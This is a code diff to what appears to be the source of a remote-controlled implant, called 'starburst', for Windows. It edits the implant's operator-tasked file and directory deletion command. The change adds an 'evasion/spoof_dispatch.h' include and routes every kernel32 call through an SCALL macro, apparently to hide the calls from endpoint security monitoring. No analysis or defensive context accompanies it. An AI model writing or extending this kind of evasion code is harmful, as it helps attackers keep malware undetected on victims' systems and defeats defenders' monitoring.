@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_RM
 
@@ -28,9 +29,9 @@ auto declfn starburst::cmd_rm(
     memory::copy( path_buf, path, copy_len );
 
     wchar_t wpath[520] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, path_buf, -1, wpath, 520 );
 
-    DWORD attrs = inst.kernel32.GetFileAttributesW( wpath );
+    DWORD attrs = (DWORD)SCALL( inst, kernel32.GetFileAttributesW, wpath );
     if ( attrs == INVALID_FILE_ATTRIBUTES ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "file not found" ) ) );
@@ -39,9 +40,9 @@ auto declfn starburst::cmd_rm(
 
     BOOL ok;
     if ( attrs & FILE_ATTRIBUTE_DIRECTORY ) {
-        ok = inst.kernel32.RemoveDirectoryW( wpath );
+        ok = (BOOL)SCALL( inst, kernel32.RemoveDirectoryW, wpath );
     } else {
-        ok = inst.kernel32.DeleteFileW( wpath );
+        ok = (BOOL)SCALL( inst, kernel32.DeleteFileW, wpath );
     }
 
     if ( ok ) {
